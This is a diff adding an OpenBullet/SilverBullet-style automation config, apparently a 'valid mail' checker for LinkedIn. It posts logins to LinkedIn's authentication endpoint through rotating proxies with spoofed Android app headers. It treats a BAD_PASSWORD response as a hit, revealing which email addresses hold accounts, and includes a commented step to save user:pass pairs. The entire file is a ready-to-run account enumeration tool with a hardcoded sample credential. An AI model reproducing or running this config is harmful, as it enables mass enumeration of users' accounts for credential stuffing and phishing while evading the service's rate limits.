@@ -1,0 +1,109 @@
+[SETTINGS]
+{
+  "Name": "Linkedin VM",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2024-01-27T12:20:55.2040564+07:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "t.me/dckzyr",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": true,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "LinkedIn VM",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST POST "https://www.linkedin.com/uas/authenticate" 
+  CONTENT "session_key=snfokesjd%40gmail.com&session_password=OPKJH8798&client_enabled_features=ANDROID_NATIVE_CAPTCHA&rememberMeOptIn=true&JSESSIONID=&bcookie=&bscookie=&lang=&li_gc=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+FUNCTION URLEncode "<COOKIES(JSESSIONID)>" -> VAR "1" 
+
+FUNCTION URLEncode "<COOKIES(bcookie)>" -> VAR "2" 
+
+FUNCTION URLEncode "<COOKIES(bscookie)>" -> VAR "3" 
+
+FUNCTION URLEncode "<COOKIES(li_gc)>" -> VAR "4" 
+
+FUNCTION URLEncode "<COOKIES(lidc)>" -> VAR "5" 
+
+FUNCTION URLEncode "<COOKIES(lang)>" -> VAR "6" 
+
+REQUEST POST "https://www.linkedin.com/uas/authenticate" 
+  CONTENT "session_key=<USER>&session_password=NavUnknown&client_enabled_features=ANDROID_NATIVE_CAPTCHA&rememberMeOptIn=true&JSESSIONID=<1>&bcookie=<2>&bscookie=<3>&lang=<6>&li_gc=<4>&lidc=<5>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: fr-FR" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Content-Length: 592" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: www.linkedin.com" 
+  HEADER "User-Agent: ANDROID OS" 
+  HEADER "X-LI-Lang: fr_FR" 
+  HEADER "X-LI-Track: {\"osName\":\"Android OS\",\"osVersion\":\"28\",\"clientVersion\":\"4.1.894\",\"clientMinorVersion\":180200,\"model\":\"Asus_ASUS_Z01QD\",\"displayDensity\":1.875,\"displayWidth\":1600,\"displayHeight\":900,\"dpi\":\"xhdpi\",\"deviceType\":\"android\",\"appId\":\"com.linkedin.android\",\"deviceId\":\"0c0b1b0f-6bb0-4517-81fb-68af01e2b024\",\"timezoneOffset\":8,\"timezone\":\"Asia\\/Shanghai\",\"storeId\":\"us_googleplay\",\"isAdTrackingLimited\":false,\"mpName\":\"voyager-android\",\"mpVersion\":\"0.967.138\"}" 
+  HEADER "X-LI-User-Agent: LIAuthLibrary:0.0.3 com.linkedin.android:4.1.894 Asus_ASUS_Z01QD:android_9" 
+  HEADER "X-RestLi-Protocol-Version: 2.0.0" 
+  HEADER "X-UDID: 0c0b1b0f-6bb0-4517-81fb-68af01e2b024" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "BAD_PASSWORD" 
+  KEYCHAIN Failure OR 
+    KEY "BAD_EMAIL" 
+  KEYCHAIN Ban OR 
+    KEY "\"login_result\":\"CHALLENGE\"" 
+
+#Save UTILITY File "LinkedIn VM.txt" AppendLines "<USER>:<PASS>" -> VAR "Save" 
+
